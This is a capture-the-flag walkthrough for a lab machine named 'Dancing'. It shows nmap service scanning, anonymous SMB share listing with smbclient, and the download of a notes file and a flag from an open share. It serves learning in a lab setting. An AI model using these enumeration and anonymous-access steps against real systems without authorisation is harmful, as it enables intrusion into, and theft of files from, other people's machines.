# Dancing

# TL;DR

- Misconfigured SMB serivce running on the target machine that allows us to login using the guest/anonymous authentication.<br>
\* The `smbclient` takes the username from the local host if one is not provided.

# Enumeration

- `ping 10.129.1.12` : to test if the server us up and running.
- We scan the host to determine running services:
```
sudo nmap -sV 10.129.1.12
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-27 22:41 PST
Nmap scan report for 10.129.1.12
Host is up (0.082s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.77 seconds
```
- From the scan we find `smb` service running on port `445/tcp`.

# Foothold

 - We can connect to the target host using the `smbclient`. In case you do not already have the `smbclient` on your local host, you can download it with `sudo apt-get install smbclient`.
 - Since we do not have a user account to connect to the target host. We can run `smbclient -L 10.129.1.12`. This will use the user from the local host and we can just press `enter` when we are prompted for a password.
 ```
smbclient -L 10.129.1.12 
Password for [WORKGROUP\<username>]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.1.12 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

 ```
 - We can enumerate each of the shares with the following command `smbclient \\\\10.129.1.12\\<sharename>`
 - We get access denied for all of the shares except the `WorkShares`:
```
smbclient \\\\10.129.1.12\\WorkShares
Password for [WORKGROUP\<username>]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 01:22:01 2021
  ..                                  D        0  Mon Mar 29 01:22:01 2021
  Amy.J                               D        0  Mon Mar 29 02:08:24 2021
  James.P                             D        0  Thu Jun  3 01:38:03 2021

```
- When we access the `WorkShares`, we see two directories. We can enumerate each of them and download the contents as follows:
```
smb: \> cd Amy.J
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 02:08:24 2021
  ..                                  D        0  Mon Mar 29 02:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 04:00:37 2021

                5114111 blocks of size 4096. 1750477 blocks available
```
```
smb: \Amy.J\> get worknotes.txt 
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```
```
smb: \Amy.J\> cd ..
smb: \> cd James.P\
mb: \James.P\> ls
  .                                   D        0  Thu Jun  3 01:38:03 2021
  ..                                  D        0  Thu Jun  3 01:38:03 2021
  flag.txt                            A       32  Mon Mar 29 02:26:57 2021

                5114111 blocks of size 4096. 1750477 blocks available
```
```
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \James.P\> exit
```
- We can now view the `flag.txt` file downloaded to our local host from the SMB share.